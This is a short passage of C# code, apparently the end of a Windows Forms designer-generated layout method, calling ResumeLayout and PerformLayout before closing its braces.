      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
